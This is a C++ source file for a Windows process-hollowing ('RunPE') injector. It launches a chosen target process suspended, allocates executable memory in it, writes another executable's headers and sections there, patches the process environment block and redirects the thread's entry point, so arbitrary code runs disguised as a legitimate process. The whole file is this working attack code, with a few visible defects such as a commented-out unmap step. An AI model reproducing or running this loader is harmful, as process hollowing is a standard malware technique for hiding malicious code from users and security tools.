#include <Windows.h>
#include <cstdio>
#include <winternl.h>

#define MAX_NO_RELOC_ATTEMPT 10

using ntunmapviewofsection = NTSTATUS(WINAPI*)(HANDLE ProcessHandle, PVOID BaseAddress);

/**
 * Function to retrieve the PE file content.
 * \param lpFilePath : path of the PE file.
 * \return : address of the content in the explorer memory.
 */
HANDLE GetFileContent(const LPSTR lpFilePath)
{
    const HANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] An error occured when trying to open the PE file !\n");
        CloseHandle(hFile);
        return nullptr;
    }

    const DWORD dFileSize = GetFileSize(hFile, nullptr);
    if (dFileSize == INVALID_FILE_SIZE)
    {
        printf("[-] An error occured when trying to get the PE file size !\n");
        CloseHandle(hFile);
        return nullptr;
    }

    const HANDLE hFileContent = HeapAlloc(GetProcessHeap(), 0, dFileSize);
    if (hFileContent == INVALID_HANDLE_VALUE)
    {
        printf("[-] An error occured when trying to allocate memory for the PE file content !\n");
        CloseHandle(hFile);
        CloseHandle(hFileContent);
        return nullptr;
    }

    const BOOL bFileRead = ReadFile(hFile, hFileContent, dFileSize, nullptr, nullptr);
    if (!bFileRead)
    {
        printf("[-] An error occured when trying to read the PE file content !\n");
        CloseHandle(hFile);
        if (hFileContent != nullptr)
            CloseHandle(hFileContent);

        return nullptr;
    }

    CloseHandle(hFile);
    return hFileContent;
}

/**
 * Function to check if the image is a valid PE file.
 * \param lpImage : PE image data.
 * \return : TRUE if the image is a valid PE else no.
 */
BOOL IsValidPE(const LPVOID lpImage)
{
    const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
    const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
    if (lpImageNTHeader->Signature == IMAGE_NT_SIGNATURE)
        return TRUE;

    return FALSE;
}

/**
 * Function to check if the image is a x86 executable.
 * \param lpImage : PE image data.
 * \return : TRUE if the image is x86 else FALSE.
 */
BOOL IsPE32(const LPVOID lpImage)
{
    const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
    const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
    if (lpImageNTHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
        return TRUE;

    return FALSE;
}

/**
 * Function to retrieve the subsystem of a PE image.
 * \param lpImage : data of the PE image.
 * \return : the subsystem charateristics.
 */
DWORD GetSubsytem(const LPVOID lpImage)
{
    const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
    const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
    return lpImageNTHeader->OptionalHeader.Subsystem;
}

/**
 * Function to retrieve the subsytem of a process.
 * \param hProcess : handle of the process.
 * \param lpImageBaseAddress : image base address of the process.
 * \return : the process subsystem charateristics.
 */
DWORD GetSubsystemEx(const HANDLE hProcess, const LPVOID lpImageBaseAddress)
{
    const IMAGE_DOS_HEADER ImageDOSHeader = {};
    const BOOL bGetDOSHeader = ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImageDOSHeader, sizeof(IMAGE_DOS_HEADER), nullptr);
    if (!bGetDOSHeader)
    {
        printf("[-] An error is occured when trying to get the target DOS header.\n");
        return -1;
    }

    const IMAGE_NT_HEADERS ImageNTHeader = {};
    const BOOL bGetNTHeader = ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)lpImageBaseAddress + ImageDOSHeader.e_lfanew), (LPVOID)&ImageNTHeader, sizeof(IMAGE_NT_HEADERS), nullptr);
    if (!bGetNTHeader)
    {
        printf("[-] An error is occured when trying to get the target NT header.\n");
        return -1;
    }

    return ImageNTHeader.OptionalHeader.Subsystem;
}

/**
 * Function to clean and exit target process.
 * \param lpPI : pointer to PROCESS_INFORMATION of the target process.
 * \param hFileContent : handle of the source image content.
 */
void CleanAndExitProcess(const LPPROCESS_INFORMATION lpPI, const HANDLE hFileContent)
{
    if (hFileContent != nullptr && hFileContent != INVALID_HANDLE_VALUE)
        HeapFree(GetProcessHeap(), 0, hFileContent);

    if (lpPI->hThread != nullptr)
        CloseHandle(lpPI->hThread);

    if (lpPI->hProcess != nullptr)
    {
        TerminateProcess(lpPI->hProcess, -1);
        CloseHandle(lpPI->hProcess);
    }
}

void CleanProcess(const LPPROCESS_INFORMATION lpPI, const HANDLE hFileContent)
{
    if (hFileContent != nullptr && hFileContent != INVALID_HANDLE_VALUE)
        HeapFree(GetProcessHeap(), 0, hFileContent);

    if (lpPI->hThread != nullptr)
        CloseHandle(lpPI->hThread);

    if (lpPI->hProcess != nullptr)
        CloseHandle(lpPI->hProcess);
}

/**
 * Function to check if the source image has a relocation table x86.
 * \param lpImage : content of the source image.
 * \return : TRUE if the image has a relocation table else FALSE.
 */
BOOL HasRelocation32(const LPVOID lpImage)
{
    const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
    const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
    if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
        return TRUE;

    return FALSE;
}

/**
 * Function to check if the source image has a relocation table x64.
 * \param lpImage : content of the source image.
 * \return : TRUE if the image has a relocation table else FALSE.
 */
BOOL HasRelocation64(const LPVOID lpImage)
{
    const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
    const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
    if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
        return TRUE;

    return FALSE;
}

BOOL RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage, const LPVOID lpPEBAddress)
{
    LPVOID lpAllocAddress = nullptr;

    const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
    const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

    for (int i = 0; i < MAX_NO_RELOC_ATTEMPT; i++)
    {
        lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (PVOID)((uintptr_t)lpImageNTHeader32->OptionalHeader.ImageBase), lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (lpAllocAddress == nullptr)
        {
            printf("[-] Alloc attempt number : %d has failed.\n", i);
            VirtualFreeEx(lpPI->hProcess, (LPVOID)(uintptr_t)lpImageNTHeader32->OptionalHeader.ImageBase, 0, MEM_RELEASE);
            continue;
        }

        printf("[+] Alloc attempt number : %d has succeeded.\n", i);
        break;
    }

    if (lpAllocAddress == nullptr)
    {
        printf("[-] An error is occured when trying to allocate memory for the new image.\n");
        return FALSE;
    }

    printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);

    const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, (LPVOID)lpImage, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);
    if (!bWriteHeaders)
    {
        printf("[-] An error is occured when trying to write the headers of the new image.\n");
        return FALSE;
    }

    printf("[+] Headers write at : 0x%X\n", (UINT)lpImageNTHeader32->OptionalHeader.ImageBase);

    for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++)
    {
        const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
        const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
        if (!bWriteSection)
        {
            printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
            return FALSE;
        }

        printf("[+] Section %s write at : 0x%X.\n", (LPSTR)lpImageSectionHeader->Name, (UINT)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
    }

    WOW64_CONTEXT CTX = {};
    CTX.ContextFlags = CONTEXT_FULL;

    const BOOL bGetContext = Wow64GetThreadContext(lpPI->hThread, &CTX);
    if (!bGetContext)
    {
        printf("[-] An error is occured when trying to get the thread context.\n");
        return FALSE;
    }

    const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 8), &lpImageNTHeader32->OptionalHeader.ImageBase, sizeof(DWORD), nullptr);
    if (!bWritePEB)
    {
        printf("[-] An error is occured when trying to write the image base in the PEB.\n");
        return FALSE;
    }

    CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);

    const BOOL bSetContext = Wow64SetThreadContext(lpPI->hThread, &CTX);
    if (!bSetContext)
    {
        printf("[-] An error is occured when trying to set the thread context.\n");
        return FALSE;
    }

    ResumeThread(lpPI->hThread);

    return TRUE;
}

BOOL RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage, const LPVOID lpPEBAddress)
{
    LPVOID lpAllocAddress = nullptr;

    const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
    const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

    for (int i = 0; i < MAX_NO_RELOC_ATTEMPT; i++)
    {
        lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (PVOID)lpImageNTHeader64->OptionalHeader.ImageBase, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (lpAllocAddress == nullptr)
        {
            printf("[-] Alloc attempt number : %d has failed.\n", i);
            VirtualFreeEx(lpPI->hProcess, (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase, 0, MEM_RELEASE);
            continue;
        }

        printf("[+] Alloc attempt number : %d has succeeded.\n", i);
        break;
    }

    if (lpAllocAddress == nullptr)
    {
        printf("[-] An error is occured when trying to allocate memory for the new image.\n");
        return FALSE;
    }

    printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);

    const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
    if (!bWriteHeaders)
    {
        printf("[-] An error is occured when trying to write the headers of the new image.\n");
        return FALSE;
    }

    printf("[+] Headers write at : 0x%X\n", (UINT)lpImageNTHeader64->OptionalHeader.ImageBase);

    for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++)
    {
        const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
        const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
        if (!bWriteSection)
        {
            printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
            return FALSE;
        }

        printf("[+] Section %s write at : 0x%X.\n", (LPSTR)lpImageSectionHeader->Name, (UINT)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
    }

    CONTEXT CTX = {};
    CTX.ContextFlags = CONTEXT_FULL;

    const BOOL bGetContext = GetThreadContext(lpPI->hThread, &CTX);
    if (!bGetContext)
    {
        printf("[-] An error is occured when trying to get the thread context.\n");
        return FALSE;
    }

    const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rbx + 8), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD), nullptr);
    if (!bWritePEB)
    {
        printf("[-] An error is occured when trying to write the image base in the PEB.\n");
        return FALSE;
    }

    CTX.Rax = (uintptr_t)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

    const BOOL bSetContext = SetThreadContext(lpPI->hThread, &CTX);
    if (!bSetContext)
    {
        printf("[-] An error is occured when trying to set the thread context.\n");
        return FALSE;
    }

    ResumeThread(lpPI->hThread);

    return TRUE;
}

int main(const int argc, char* argv[])
{
    LPSTR lpSourceImage;
    LPSTR lpTargetProcess;

    if (argc == 3)
    {
        lpSourceImage = argv[1];
        lpTargetProcess = argv[2];
    }
    else
    {
        printf("[HELP] runpe.exe <pe_file> <target_process>\n");
        return -1;
    }

    printf("[PROCESS HOLLOWING]\n");

    const LPVOID hFileContent = GetFileContent(lpSourceImage);
    printf("[+] PE file content : 0x%p\n", (LPVOID)(uintptr_t)hFileContent);

    const BOOL bPE = IsValidPE(hFileContent);
    if (!bPE)
    {
        printf("[-] The PE file is no valid.\n");
        if (hFileContent != nullptr)
            CloseHandle(hFileContent);
        return -1;
    }

    printf("[+] The PE file is valid.\n");

    const HMODULE hModule = GetModuleHandleA("ntdll.dll");
    if (hModule == nullptr)
    {
        printf("[-] An error is occured when trying to get the \"ntdll.dll\" module.\n");
        if (hFileContent != nullptr)
            CloseHandle(hFileContent);
        return -1;
    }

    printf("[+] ntdll.dll address : 0x%p\n", (LPVOID)(uintptr_t)hModule);

    const auto NtUnmapViewOfSection = (ntunmapviewofsection)GetProcAddress(hModule, "ZwUnmapViewOfSection");
    if (NtUnmapViewOfSection == nullptr)
    {
        printf("[-] An error is occured when trying to get the \"NtUnmapViewOfSection\" function.\n");
        if (hFileContent != nullptr)
            CloseHandle(hFileContent);
        return -1;
    }

    printf("[+] NtUnmapViewOfSection function at : 0x%p\n", (LPVOID)NtUnmapViewOfSection);

    STARTUPINFOA SI;
    PROCESS_INFORMATION PI;

    ZeroMemory(&SI, sizeof(SI));
    SI.cb = sizeof(SI);
    ZeroMemory(&PI, sizeof(PI));

    const BOOL bProcessCreation = CreateProcessA(lpTargetProcess, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, nullptr, nullptr, &SI, &PI);
    if (!bProcessCreation)
    {
        printf("[-] An error is occured when trying to create the target process.\n");
        CleanAndExitProcess(&PI, hFileContent);
        return -1;
    }

    BOOL bTarget32;
    IsWow64Process(PI.hProcess, &bTarget32);

    LPVOID lpImageBaseAddress = nullptr;
    LPVOID lpPEBAddress;
    if (bTarget32)
    {
        WOW64_CONTEXT CTX = {};
        CTX.ContextFlags = CONTEXT_FULL;
        Wow64GetThreadContext(PI.hThread, &CTX);
        lpPEBAddress = (LPVOID)(uintptr_t)CTX.Ebx;
        const BOOL bReadBaseAddress = ReadProcessMemory(PI.hProcess, (LPVOID)(uintptr_t)(CTX.Ebx + 8), &lpImageBaseAddress, sizeof(DWORD), nullptr);
        if (!bReadBaseAddress)
        {
            printf("[-] An error is occured when trying to get the image base address of the target process.\n");
            CleanAndExitProcess(&PI, hFileContent);
            return -1;
        }
    }
    else
    {
        CONTEXT CTX = {};
        CTX.ContextFlags = CONTEXT_FULL;
        GetThreadContext(PI.hThread, &CTX);
        lpPEBAddress = (LPVOID)CTX.Rbx;
        const BOOL bReadBaseAddress = ReadProcessMemory(PI.hProcess, (LPVOID)(CTX.Rbx + 8), &lpImageBaseAddress, sizeof(DWORD), nullptr);
        if (!bReadBaseAddress)
        {
            printf("[-] An error is occured when trying to get the image base address of the target process.\n");
            CleanAndExitProcess(&PI, hFileContent);
            return -1;
        }
    }

    printf("[+] Target Process PEB : 0x%p\n", lpPEBAddress);
    printf("[+] Target Process Image Base : 0x%p\n", lpImageBaseAddress);

    const BOOL bSource32 = IsPE32(hFileContent);
    if (bSource32)
        printf("[+] Source PE Image architecture : x86\n");
    else
        printf("[+] Source PE Image architecture : x64\n");

    if (bTarget32)
        printf("[+] Target PE Image architecture : x86\n");
    else
        printf("[+] Target PE Image architecture : x64\n");

    if (bSource32 && bTarget32)
        printf("[+] Architecture are compatible.\n");
    else
    {
        printf("[-] Architecture are not compatible.\n");
        return -1;
    }

    const DWORD dwSourceSubsystem = GetSubsytem(hFileContent);
    if (dwSourceSubsystem == -1)
    {
        printf("[-] An error is occured when trying to get the subsytem of the source image.\n");
        CleanAndExitProcess(&PI, hFileContent);
        return -1;
    }

    printf("[+] Source Image subsystem : 0x%X\n", (UINT)dwSourceSubsystem);

    const DWORD dwTargetSubsystem = GetSubsystemEx(PI.hProcess, lpImageBaseAddress);
    if (dwTargetSubsystem == -1)
    {
        printf("[-] An error is occured when trying to get the subsytem of the target process.\n");
        CleanAndExitProcess(&PI, hFileContent);
        return -1;
    }

    printf("[+] Target Process subsystem : 0x%X\n", (UINT)dwTargetSubsystem);

    if (dwSourceSubsystem == dwTargetSubsystem)
        printf("[+] Subsytems are compatible.\n");
    else
    {
        printf("[-] Subsytems are not compatible.\n");
        CleanAndExitProcess(&PI, hFileContent);
        return -1;
    }

    system("PAUSE");

    /*
    const NTSTATUS UnmapStatus = NtUnmapViewOfSection(PI.hProcess, lpImageBaseAddress);
    if (UnmapStatus < 0)
    {
        printf("[-] An error is occured when trying unamp the image of the target process.\n");
        CleanAndExitProcess(&PI, hFileContent);
        return -1;
    }

    printf("[+] Target process image has been freed.\n");
    */

    BOOL bHasReloc;
    if (bSource32)
        bHasReloc = HasRelocation32(hFileContent);
    else
        bHasReloc = HasRelocation64(hFileContent);

    if (!bHasReloc)
    {
        printf("[+] The source image doesn't have a relocation table.\n");
    }
    else
    {
        printf("[+] The source image has a relocation table.\n");
    }

    if (bSource32)
    {
        if (RunPE32(&PI, hFileContent, lpPEBAddress))
        {
            printf("[+] The injection has succeed !\n");
            CleanProcess(&PI, hFileContent);
            return 0;
        }
    }
    else
    {
        if (RunPE64(&PI, hFileContent, lpPEBAddress))
        {
            printf("[+] The injection has succeed !\n");
            CleanProcess(&PI, hFileContent);
            return 0;
        }
    }
    
    printf("[-] The injection has failed !\n");

    if (hFileContent != nullptr)
        HeapFree(GetProcessHeap(), 0, hFileContent);

    if (PI.hThread != nullptr)
        CloseHandle(PI.hThread);

    if (PI.hProcess != nullptr)
    {
        TerminateProcess(PI.hProcess, -1);
        CloseHandle(PI.hProcess);
    }

    return -1;
}